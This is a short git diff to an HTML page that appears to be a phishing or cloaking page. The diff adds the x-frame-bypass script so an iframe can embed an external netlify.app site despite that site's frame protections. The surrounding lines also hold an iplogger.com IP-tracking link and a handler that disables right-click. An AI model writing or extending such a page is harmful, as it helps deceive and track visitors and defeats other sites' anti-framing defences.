@@ -30,6 +30,8 @@ document.location = "mobile.html";
 
 <script>https://iplogger.com/1FgVA4<script>
 <head>
+ <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
+ <script type="module" src="https://unpkg.com/x-frame-bypass"></script>
 <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 <script type="text/javascript">
 
@@ -107,7 +109,7 @@ document.oncontextmenu = new function("return false");
 
 </script>
 
-	<iframe src="https://magical-blini-fe3fcb.netlify.app"
+	<iframe is="x-frame-bypass" src="https://magical-blini-fe3fcb.netlify.app"
 			frameborder="0"
 			marginheight="0"
 			marginwidth="0"
